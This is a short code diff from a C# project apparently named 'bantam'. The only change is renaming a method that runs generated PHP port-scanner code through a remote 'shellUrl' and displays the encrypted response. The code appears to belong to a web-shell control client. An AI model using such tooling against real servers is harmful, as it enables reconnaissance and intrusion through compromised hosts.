@@ -93,7 +93,7 @@ namespace bantam.Forms
                 string responseText = "[" + shellUrl + "] - returned ports (" + scannedRange + ") - \r\n";
                 string phpCode = PhpHelper.PortScanner(textBoxTarget.Text, portsCode, encryptResponse);
 
-                BantamMain.executePHPCodeDisplayInRichTextBox(shellUrl, phpCode, windowTitle, encryptResponse, (int)EncryptionHelper.RESPONSE_ENCRYPTION_TYPES.OPENSSL, rtb, responseText);
+                BantamMain.ExecutePHPCodeDisplayInRichTextBox(shellUrl, phpCode, windowTitle, encryptResponse, (int)EncryptionHelper.RESPONSE_ENCRYPTION_TYPES.OPENSSL, rtb, responseText);
 
                 btnScan.Enabled = true;
             }
